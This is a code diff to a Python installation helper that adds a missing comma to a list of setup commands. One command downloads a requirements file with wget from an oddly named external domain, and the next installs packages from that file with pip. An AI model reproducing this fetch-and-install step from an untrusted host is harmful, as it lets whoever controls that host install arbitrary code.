@@ -14,7 +14,7 @@ def install_libraries(pip):
         f"cd {variables('root')}",
         f"{pip} install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121",
         f"{pip} install tensorflow[and-cuda]",
-        "wget https://q4j3.c11.e2-5.dev/downloads/req.txt"
+        "wget https://q4j3.c11.e2-5.dev/downloads/req.txt",
         f"{pip} install -r {variables('root')}/req.txt"
     )
 
